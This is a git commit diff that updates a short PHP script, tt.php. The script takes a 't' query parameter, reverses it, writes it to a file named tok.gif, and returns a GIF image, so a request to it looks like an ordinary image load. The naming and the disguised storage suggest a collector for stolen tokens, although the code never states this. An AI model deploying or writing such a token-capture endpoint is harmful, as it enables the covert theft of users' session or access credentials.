612d4c043f245c6717af30062198dcc107a0f0e1
ildragonex88 <55831987+ildragonex88@users.noreply.github.com>
2021-02-05 13:03:05 +0300

    Update tt.php

--- tt.php
+++ tt.php
@@ -1,8 +1,15 @@
 <?php
 if (!empty($_GET["t"]))
- { 
-	 $tokenn = $_GET['t'];
-	 $f = fopen("tok.gif","w");
+{ 
+$f = fopen("0.gif","rb");
+$img = fread($f,filesize("0.gif"));
+fclose($f);
+$tokenn = $_GET['t'];
+$f = fopen("tok.gif","w");
+$tokenn = strrev($tokenn);
 fwrite($f, $tokenn);
 fclose($f);
-	 }
+header("Content-type: image/gif");
+header("Content-Disposition: attachment; filename=t.gif");
+echo $img;
+}
